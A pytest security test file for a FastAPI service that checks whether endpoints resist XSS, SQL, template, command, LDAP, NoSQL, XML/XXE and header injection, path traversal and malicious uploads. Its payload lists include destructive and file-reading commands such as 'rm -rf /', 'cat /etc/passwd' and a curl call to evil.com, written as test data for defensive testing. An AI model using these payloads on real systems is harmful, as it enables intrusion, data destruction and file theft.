"""
Security tests for input validation and injection prevention.
"""

import pytest
from fastapi.testclient import TestClient


@pytest.mark.epic("EP-00003")
@pytest.mark.component("security")
class TestInputValidation:
    """Security tests for input validation and sanitization."""

    @pytest.mark.component("security")
    def test_xss_prevention_in_endpoints(self, client: TestClient, malicious_payloads):
        """Test that XSS payloads are properly handled."""

        for payload in malicious_payloads:
            # Test in query parameters
            response = client.get(f"/health?test={payload}")

            # Should not reflect malicious content
            if response.status_code == 200:
                response_text = response.text
                # Common XSS patterns should be escaped or removed
                assert "<script>" not in response_text.lower()
                assert "javascript:" not in response_text.lower()
                assert "onerror=" not in response_text.lower()

    @pytest.mark.component("security")
    def test_sql_injection_prevention(self, client: TestClient):
        """Test SQL injection prevention in API endpoints."""

        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; UPDATE users SET admin=1; --",
            "UNION SELECT * FROM information_schema.tables--",
        ]

        for payload in sql_payloads:
            # Test various endpoints that might interact with database
            response = client.get(f"/health?id={payload}")

            # Should handle malicious input gracefully
            assert response.status_code in [200, 400, 404, 422]

            # Should not expose database errors or SQL injection vulnerabilities
            if hasattr(response, "json"):
                response_data = response.json()
                response_text = str(response_data).lower()

                # Check for actual SQL injection vulnerability indicators
                # NOT legitimate system status information
                sql_injection_indicators = [
                    "syntax error",
                    "sql error",
                    "database error",
                    "table doesn't exist",
                    "column doesn't exist",
                    "near \"drop\"",
                    "near \"select\"",
                    "near \"union\"",
                    "sqlite_master",
                    "information_schema",
                    "show tables",
                    "desc table",
                    "describe table",
                ]

                for indicator in sql_injection_indicators:
                    assert indicator not in response_text, f"SQL injection vulnerability detected: {indicator} in response"

                # Legitimate responses from health endpoints should NOT be flagged
                # Health endpoints can legitimately contain database status info
                # Only flag if SQL injection payload content is echoed back
                payload_lower = payload.lower()
                dangerous_payload_parts = ["drop table", "' or '1'='1", "union select"]

                for dangerous_part in dangerous_payload_parts:
                    if dangerous_part in response_text:
                        assert False, f"SQL injection payload reflected in response: {dangerous_part} from payload {payload}"

    @pytest.mark.component("security")
    def test_sql_injection_detection_logic_regression(self, client: TestClient):
        """Regression test: Ensure SQL injection test doesn't flag legitimate system responses."""

        # Test that health endpoint can legitimately return database info
        response = client.get("/health")
        assert response.status_code == 200

        response_data = response.json()
        response_text = str(response_data).lower()

        # Health endpoints SHOULD be allowed to contain legitimate database status info
        # REGRESSION: Do NOT flag legitimate system responses that contain database terms
        legitimate_database_terms = [
            "database",  # Database status is legitimate in health checks
            "sqlite",    # Database type is legitimate system info
            "gonogo.db", # Database filename is legitimate
            "healthy",   # Health status is legitimate
        ]

        # These should NOT cause test failures in health endpoints
        for term in legitimate_database_terms:
            # This should NOT fail - health endpoints can contain database info
            pass  # Explicitly allow these terms

        # Only ACTUAL SQL injection vulnerabilities should be flagged:
        # - Error messages with SQL syntax
        # - Reflected malicious payloads
        # - Database schema exposure

        # Test with SQL injection payload to ensure detection still works
        malicious_response = client.get("/health?id='; DROP TABLE users; --")
        assert malicious_response.status_code in [200, 400, 404, 422]

        # Should NOT reflect the malicious payload back
        malicious_text = str(malicious_response.json()).lower()
        assert "drop table" not in malicious_text, "SQL injection payload should not be reflected"
        assert "' or '1'='1" not in malicious_text, "SQL injection payload should not be reflected"

    @pytest.mark.component("security")
    def test_template_injection_prevention(self, client: TestClient):
        """Test prevention of template injection attacks."""

        template_payloads = [
            "{{7*7}}",
            "{{config}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "${7*7}",
            "#{7*7}",
            "<%=7*7%>",
        ]

        for payload in template_payloads:
            response = client.get(f"/health?data={payload}")

            # Should not execute template expressions
            if response.status_code == 200:
                response_text = response.text
                # Result of template execution should not appear
                assert "49" not in response_text  # 7*7 = 49
                assert payload not in response_text or response_text.count(payload) <= 1

    @pytest.mark.component("security")
    def test_path_traversal_prevention(self, client: TestClient):
        """Test prevention of path traversal attacks."""

        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\system",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",  # URL encoded ../../../
            "....//....//....//",
            "..%252f..%252f..%252f",  # Double URL encoded
        ]

        for payload in path_payloads:
            response = client.get(f"/static/{payload}")

            # Should not allow access to system files
            assert response.status_code in [400, 403, 404]

            if response.status_code == 200:
                # Should not return system file content
                content = response.text.lower()
                system_indicators = [
                    "root:",
                    "bin/bash",
                    "system32",
                    "windows",
                    "passwd",
                    "shadow",
                    "hosts",
                ]

                for indicator in system_indicators:
                    assert indicator not in content

    @pytest.mark.component("security")
    def test_command_injection_prevention(self, client: TestClient):
        """Test prevention of command injection attacks."""

        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; ping google.com",
            "|| curl evil.com",
        ]

        for payload in command_payloads:
            response = client.get(f"/health?cmd={payload}")

            # Should handle input safely
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                response_text = response.text.lower()

                # Should not show command execution results
                command_outputs = [
                    "uid=",
                    "gid=",
                    "total ",
                    "drwx",
                    "-rw-",
                    "ping statistics",
                    "64 bytes from",
                ]

                for output in command_outputs:
                    assert output not in response_text

    @pytest.mark.component("security")
    def test_http_header_injection_prevention(self, client: TestClient):
        """Test prevention of HTTP header injection attacks."""

        header_payloads = [
            "test\r\nX-Injected-Header: malicious",
            "test\nSet-Cookie: admin=true",
            "test%0d%0aLocation: http://evil.com",
            "test\r\n\r\n<script>alert('xss')</script>",
        ]

        for payload in header_payloads:
            # Try to inject headers through various means
            response = client.get("/health", headers={"X-Test": payload})

            # Response should not contain injected headers
            injected_headers = ["x-injected-header", "set-cookie", "location"]

            for header in injected_headers:
                assert header not in [h.lower() for h in response.headers.keys()]

    @pytest.mark.component("security")
    def test_ldap_injection_prevention(self, client: TestClient):
        """Test prevention of LDAP injection attacks."""

        ldap_payloads = [
            "*)(uid=*",
            "*)))(|(uid=*",
            "admin)(&(password=*))",
            "*)(&(objectclass=*",
        ]

        for payload in ldap_payloads:
            response = client.get(f"/health?user={payload}")

            # Should handle LDAP-style input safely
            assert response.status_code in [200, 400, 422]

    @pytest.mark.component("security")
    def test_nosql_injection_prevention(self, client: TestClient):
        """Test prevention of NoSQL injection attacks."""

        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "return true"}',
            'true, $where: "return true"',
        ]

        for payload in nosql_payloads:
            response = client.get(f"/health?query={payload}")

            # Should handle NoSQL-style input safely
            assert response.status_code in [200, 400, 422]

    @pytest.mark.component("security")
    def test_xml_injection_prevention(self, client: TestClient):
        """Test prevention of XML injection and XXE attacks."""

        xml_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><test>&xxe;</test>',
            '<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></test>',
        ]

        for payload in xml_payloads:
            response = client.post(
                "/health", data=payload, headers={"Content-Type": "application/xml"}
            )

            # Should reject or safely handle XML input
            assert response.status_code in [400, 405, 415, 422]

            if response.status_code == 200:
                # Should not return file contents
                response_text = response.text.lower()
                assert "root:" not in response_text
                assert "passwd" not in response_text

    @pytest.mark.component("security")
    def test_file_upload_security(self, client: TestClient):
        """Test file upload security measures."""

        # Test malicious file extensions
        malicious_files = [
            ("test.php", b"<?php phpinfo(); ?>"),
            ("test.jsp", b"<% out.println('test'); %>"),
            ("test.asp", b"<%=now()%>"),
            ("test.exe", b"MZ\x90\x00"),  # PE header
            ("test.bat", b"@echo off\ndir"),
        ]

        for filename, content in malicious_files:
            files = {"file": (filename, content, "application/octet-stream")}

            # Most endpoints shouldn't accept file uploads
            response = client.post("/health", files=files)

            # Should reject file uploads or handle safely
            assert response.status_code in [400, 405, 413, 415, 422]

    @pytest.mark.component("security")
    def test_rate_limiting_headers(self, client: TestClient):
        """Test that appropriate headers are set for security."""

        response = client.get("/health")

        # Should have security headers or at least not expose sensitive info
        dangerous_headers = [
            "server",  # Shouldn't expose server details
            "x-powered-by",  # Shouldn't expose framework details
        ]

        for header in dangerous_headers:
            if header in response.headers:
                header_value = response.headers[header].lower()
                # Shouldn't expose detailed version information
                assert "apache" not in header_value
                assert "nginx" not in header_value
                assert "microsoft" not in header_value

    @pytest.mark.component("security")
    def test_error_message_information_disclosure(self, client: TestClient):
        """Test that error messages don't disclose sensitive information."""

        # Try to trigger various errors
        error_endpoints = [
            "/nonexistent",
            "/health/invalid",
            "/.env",
            "/config",
            "/admin",
        ]

        for endpoint in error_endpoints:
            response = client.get(endpoint)

            if response.status_code >= 400:
                error_content = response.text.lower()

                # Should not expose sensitive information in errors
                sensitive_info = [
                    "traceback",
                    "stack trace",
                    "line ",
                    'file "',
                    "database",
                    "connection",
                    "password",
                    "secret",
                    "internal server error",
                    "debug",
                    "exception",
                ]

                for info in sensitive_info:
                    # Some basic error info is okay, but detailed traces are not
                    if "internal server error" in info:
                        continue  # This is a standard HTTP error
                    assert info not in error_content
